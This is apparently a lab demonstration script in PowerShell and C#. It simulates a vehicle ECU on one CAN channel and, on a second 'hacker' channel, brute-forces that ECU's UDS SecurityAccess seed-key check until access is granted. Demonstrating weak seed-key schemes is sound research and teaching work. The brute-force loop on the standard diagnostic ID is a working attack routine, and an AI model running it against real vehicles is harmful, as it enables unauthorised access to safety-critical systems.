
# Define C# Type for VCI_INIT_CONFIG
$source = @"
using System;
using System.Runtime.InteropServices;

public struct VCI_INIT_CONFIG {
    public UInt32 AccCode;
    public UInt32 AccMask;
    public UInt32 Reserved;
    public byte Filter;
    public byte Timing0;
    public byte Timing1;
    public byte Mode;
}

public struct VCI_CAN_OBJ {
    public UInt32 ID;
    public UInt32 TimeStamp;
    public byte TimeFlag;
    public byte SendType;
    public byte RemoteFlag;
    public byte ExternFlag;
    public byte DataLen;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
    public byte[] Data;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
    public byte[] Reserved;
}

public class CANWrapper {
    [DllImport("ControlCAN.dll", EntryPoint = "VCI_OpenDevice", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_OpenDevice(UInt32 DeviceType, UInt32 DeviceInd, UInt32 Reserved);

    [DllImport("ControlCAN.dll", EntryPoint = "VCI_InitCAN", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_InitCAN(UInt32 DeviceType, UInt32 DeviceInd, UInt32 CANInd, ref VCI_INIT_CONFIG pInitConfig);

    [DllImport("ControlCAN.dll", EntryPoint = "VCI_StartCAN", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_StartCAN(UInt32 DeviceType, UInt32 DeviceInd, UInt32 CANInd);

    [DllImport("ControlCAN.dll", EntryPoint = "VCI_Receive", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_Receive(UInt32 DeviceType, UInt32 DeviceInd, UInt32 CANInd, [In, Out] VCI_CAN_OBJ[] pReceive, UInt32 Len, Int32 WaitTime);

    [DllImport("ControlCAN.dll", EntryPoint = "VCI_Transmit", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_Transmit(UInt32 DeviceType, UInt32 DeviceInd, UInt32 CANInd, [In] VCI_CAN_OBJ[] pSend, UInt32 Len);
    
    [DllImport("ControlCAN.dll", EntryPoint = "VCI_CloseDevice", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_CloseDevice(UInt32 DeviceType, UInt32 DeviceInd);
    
    [DllImport("ControlCAN.dll", EntryPoint = "VCI_GetReceiveNum", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_GetReceiveNum(UInt32 DeviceType, UInt32 DeviceInd, UInt32 CANInd);
}
"@

Add-Type -TypeDefinition $source
$DLL_PATH = Join-Path (Get-Location) "ControlCAN.dll"

# Setup
$DEV_PRO = 21; $DEV_IND = 0
$CAN_ECU = 0; $CAN_HACKER = 1
$BAUD_TIMING0 = 0x01; $BAUD_TIMING1 = 0x1C

function Send-Msg {
    param($Ch, $Id, $DataBytes)
    $obj = New-Object VCI_CAN_OBJ
    $obj.ID = $Id; $obj.DataLen = $DataBytes.Length; $obj.Data = New-Object byte[] 8
    for ($i = 0; $i -lt $DataBytes.Length; $i++) { $obj.Data[$i] = $DataBytes[$i] }
    $arr = @($obj)
    [CANWrapper]::VCI_Transmit($DEV_PRO, $DEV_IND, $Ch, $arr, 1) > $null
}

try {
    Write-Host "INITIALIZING AUTO-ATTACK ROBOT..." -ForegroundColor Cyan
    $res = [CANWrapper]::VCI_OpenDevice($DEV_PRO, $DEV_IND, 0)
    if ($res -ne 1) { Write-Host "Error OpenDevice"; exit }

    $config = New-Object VCI_INIT_CONFIG
    $config.AccCode = 0; $config.AccMask = 0; $config.Filter = 1; $config.Timing0 = $BAUD_TIMING0; $config.Timing1 = $BAUD_TIMING1; $config.Mode = 0
    
    [CANWrapper]::VCI_InitCAN($DEV_PRO, $DEV_IND, $CAN_ECU, [ref]$config)
    [CANWrapper]::VCI_StartCAN($DEV_PRO, $DEV_IND, $CAN_ECU)
    [CANWrapper]::VCI_InitCAN($DEV_PRO, $DEV_IND, $CAN_HACKER, [ref]$config)
    [CANWrapper]::VCI_StartCAN($DEV_PRO, $DEV_IND, $CAN_HACKER)

    Write-Host "BUS CONNECTED. STARTING ATTACK SEQUENCE." -ForegroundColor Green
    Start-Sleep -Seconds 1
    
    # --- PHASE 1: REQUEST SEED ---
    Write-Host "[HACKER] Requesting Seed..."
    Send-Msg $CAN_HACKER 0x7E0 @(0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00)

    # VARIABLES
    $HackerState = "WAIT_SEED"
    $CapturedSeed = 0
    $CurrentGuess = 0
    $AttackOffset = 0
    
    # ECU SETUP
    $RealSeed = 2712847316 # 0xA1B2C3D4
    $RealKey = 2712847358  # Seed + 42 = 2712847316 + 42

    # GAME LOOP
    while ($true) {
        Start-Sleep -Milliseconds 10

        # --- ECU LOGIC (SERVER) ---
        $num = [CANWrapper]::VCI_GetReceiveNum($DEV_PRO, $DEV_IND, $CAN_ECU)
        if ($num -gt 0) {
            $rxObjs = New-Object VCI_CAN_OBJ[] $num
            for ($x = 0; $x -lt $num; $x++) { $rxObjs[$x] = New-Object VCI_CAN_OBJ; $rxObjs[$x].Data = New-Object byte[] 8; $rxObjs[$x].Reserved = New-Object byte[] 3 }
            [CANWrapper]::VCI_Receive($DEV_PRO, $DEV_IND, $CAN_ECU, $rxObjs, $num, 0) > $null
            
            foreach ($m in $rxObjs) {
                # Handle Seed Req
                if ($m.ID -eq 0x7E0 -and $m.Data[2] -eq 0x01) {
                    # Send Seed
                    $b = [BitConverter]::GetBytes([UInt32]$RealSeed)
                    if ([BitConverter]::IsLittleEndian) { [Array]::Reverse($b) }
                    Send-Msg $CAN_ECU 0x7E8 @(0x06, 0x67, 0x01, $b[0], $b[1], $b[2], $b[3])
                }
                # Handle Key Req
                if ($m.ID -eq 0x7E0 -and $m.Data[2] -eq 0x02) {
                    $kB = @($m.Data[3], $m.Data[4], $m.Data[5], $m.Data[6])
                    if ([BitConverter]::IsLittleEndian) { [Array]::Reverse($kB) }
                    $checkKey = [BitConverter]::ToUInt32($kB, 0)
                     
                    if ($checkKey -eq $RealKey) {
                        Send-Msg $CAN_ECU 0x7E8 @(0x02, 0x67, 0x02) # Success
                    }
                    else {
                        Send-Msg $CAN_ECU 0x7F8 @(0x7F, 0x27, 0x35) # Fail
                    }
                }
            }
        }

        # --- HACKER LOGIC (CLIENT) ---
        
        # 1. READ INBOX
        $numH = [CANWrapper]::VCI_GetReceiveNum($DEV_PRO, $DEV_IND, $CAN_HACKER)
        if ($numH -gt 0) {
            # Read logic same as above...
            $rxObjsH = New-Object VCI_CAN_OBJ[] $numH
            for ($x = 0; $x -lt $numH; $x++) { $rxObjsH[$x] = New-Object VCI_CAN_OBJ; $rxObjsH[$x].Data = New-Object byte[] 8; $rxObjsH[$x].Reserved = New-Object byte[] 3 }
            [CANWrapper]::VCI_Receive($DEV_PRO, $DEV_IND, $CAN_HACKER, $rxObjsH, $numH, 0) > $null
             
            foreach ($m in $rxObjsH) {
                if ($m.ID -eq 0x7E8 -and $m.Data[1] -eq 0x67 -and $m.Data[2] -eq 0x01) {
                    $b = @($m.Data[3], $m.Data[4], $m.Data[5], $m.Data[6])
                    if ([BitConverter]::IsLittleEndian) { [Array]::Reverse($b) }
                    $CapturedSeed = [BitConverter]::ToUInt32($b, 0)
                    Write-Host "[HACKER] Seed Found: $([Convert]::ToString($CapturedSeed, 16).ToUpper())" -ForegroundColor Yellow
                    $HackerState = "CRACKING"
                    $CurrentGuess = $CapturedSeed # Start guessing from Seed
                }
                if ($m.ID -eq 0x7E8 -and $m.Data[1] -eq 0x67 -and $m.Data[2] -eq 0x02) {
                    Write-Host "`n[HACKER] !!! KEY CRACKED !!! ACCESS GRANTED" -ForegroundColor Magenta
                    Write-Host "The Secret Key was: $([Convert]::ToString($CurrentGuess, 16).ToUpper())" -ForegroundColor Green
                    exit
                }
                if ($m.ID -eq 0x7F8) {
                    # Fail, keeps looping
                }
            }
        }
        
        # 2. PERFORM ATTACK
        if ($HackerState -eq "CRACKING") {
            # Try next key
            $TargetKey = $CurrentGuess
            Write-Host -NoNewline "`r[BRUTE FORCE] Trying Key: $([Convert]::ToString($TargetKey, 16).ToUpper())  " 
            
            $b = [BitConverter]::GetBytes([UInt32]$TargetKey)
            if ([BitConverter]::IsLittleEndian) { [Array]::Reverse($b) }
            Send-Msg $CAN_HACKER 0x7E0 @(0x06, 0x27, 0x02, $b[0], $b[1], $b[2], $b[3])
            
            $CurrentGuess++
            Start-Sleep -Milliseconds 50 # Speed of attack
        }
    }

}
finally { [CANWrapper]::VCI_CloseDevice($DEV_PRO, $DEV_IND); Write-Host "Done." }
